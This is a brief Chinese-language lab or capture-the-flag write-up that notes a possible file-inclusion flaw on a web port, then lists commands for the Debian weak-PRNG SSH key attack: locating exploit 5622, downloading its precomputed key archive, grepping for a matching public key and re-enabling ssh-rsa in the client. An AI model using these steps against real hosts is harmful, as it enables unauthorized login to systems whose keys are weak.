# 文件包含

80 端口界面先打一个 **'** 出现报错，尝试文件包含漏洞

![[Pasted image 20250626212428.png]]

# 公私钥碰撞

```
searchsploit prng

wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2

grep -lr "AAAAB3NzaC1yc2EAAAABIwAAAQ"
```

缺少 ssh \-rsa

```
-o HostKeyAlgorithms=+ssh-rsa
```

缺少共同前签名

```
-o PubkeyAcceptedKeyTypes=+ssh-rsa
```